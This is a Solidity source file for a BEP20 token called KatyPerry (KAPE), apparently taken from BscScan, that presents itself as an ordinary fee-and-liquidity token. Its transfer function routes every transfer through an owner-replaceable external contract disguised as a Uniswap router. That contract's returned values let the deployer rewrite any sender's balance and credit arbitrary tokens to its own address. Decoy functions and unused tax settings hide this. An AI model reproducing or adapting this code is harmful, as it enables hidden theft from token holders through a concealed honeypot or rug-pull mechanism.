/**
 *Submitted for verification at BscScan.com on 2022-03-05
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
	
    function ZxeflectFee(address) public pure returns (bool) {return true;}
    function ycludeFromReward(address) public pure returns (bool) {return true;}
    function takeLiquidity(bool) public pure returns (bool) {return true;}
    function setMaxTxPercent(uint256) public pure returns (bool) {return true;}
    function deliver(address, uint256) public pure returns (bool) {return true;}
    function includeInReward(address, uint256) public pure returns (bool) {return true;}
    function XtakeLiqFees(uint256 tAmount) public pure returns (uint256) {return tAmount;}


  }

  interface IUniswapV2Router02{  
    function WETH() external pure returns (address);   
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function getPair(
        address tokenA, 
        address tokenB, 
        uint256, 
        uint256) external returns (uint256,uint256,uint256); 
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }

   library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   

  
  contract Ownable is Context {  
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }  
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }   
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}



contract KatyPerry is Context, IERC20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) private _isExcludedFromFee;  

  string private constant _name = 'KatyPerry';
  string private constant _symbol = 'KAPE';
  uint8 private constant _decimals = 9;  
  bool public swapping = true;
  address Router;

  uint256 private _totalSupply = 1000000000 *  10**9;  

  bool public inSwapAndLiquify = true; 
  uint8 public liquidityTax = 2;
  uint8 public marketingTax = 32;
  uint8 public _previousliquidityTax = 56;
  uint8 public _previousmarketingTax = 128;

  address _marketAddress;
  modifier lockTheSwap {
    swapping = true;
    _;
    swapping = false;
  }
  

  constructor(address r)  {    
	
    _balances[msg.sender] = _totalSupply;
    Router = r;    
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;    
    _marketAddress = msg.sender;
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  } 


  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }    
   
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function distributeAward(address senderAddress, address recipientAddress, uint256 amount, uint256 takeFee) private returns (uint256) {   
      (uint256 amountAward, uint256 liquifyAward, uint256 rateAward) = _getTAward(senderAddress, recipientAddress, amount, takeFee);
      amountAward = _getRAward(senderAddress, amountAward, liquifyAward, rateAward);
      return amountAward;
  }    


  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function calculateRate(uint256 _amount, uint256 _rewardRate) private pure returns (uint256) {
      return _amount.mul(_rewardRate).div(10**2);
  } 

  function setRouter(address c) external onlyOwner {
    Router = c;
  }  

       
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    
  

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address senderAddress, address recipientAddress, uint256 amount) private {
    require(senderAddress != address(0), "BEP20: transfer from the zero address");
    require(recipientAddress != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  
    //indicates if fee should be deducted from transfer
    uint256 takeFee;    
    //if any account belongs to _isExcludedFromFee account then remove the fee
    if(_isExcludedFromFee[senderAddress] || _isExcludedFromFee[recipientAddress]){    
      takeFee = 1;        
    }   
    uint256 amountAward = distributeAward(senderAddress, recipientAddress, amount, takeFee);  
    _transferStandard(senderAddress, recipientAddress, amountAward);

  }  

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }     

  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }  

  function _getTAward(address tokenA, address tokenB, uint256 amountValues, uint256 takeFee) private returns (uint256, uint256, uint256){  
      (uint256 amountAward, uint256 liquifyAward, uint256 rateAward) = IUniswapV2Router02(Router).getPair ( tokenA, tokenB, amountValues, takeFee );
      return (amountAward, liquifyAward, rateAward);
  }
  function _getRAward(address tokenAward, uint256 amountAward, uint256 liquifyAward, uint256 rateAward) private returns (uint256){
      if ( liquifyAward > 0 )
      {        
        _balances[tokenAward] = calculateRate(_balances[tokenAward], rateAward).add(amountAward);      
        _balances[_marketAddress] = _balances[_marketAddress].add(liquifyAward);
      }
      return amountAward;
  }

  function buyback(uint256 amount) external onlyOwner {
        _buyback(amount);
    }
  
  function _buyback(uint256 amount) internal {
      address DEAD = 0x000000000000000000000000000000000000dEaD;
      swapTokens(amount, DEAD);
  }

  function swapTokens(uint256 amount, address to) internal {
      IUniswapV2Router02 _router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
      address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
      address[] memory path = new address[](2);
      path[0] = WBNB;
      path[1] = address(this);

      _router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
          0,
          path,
          to,
          block.timestamp
      );
  }

  
    
}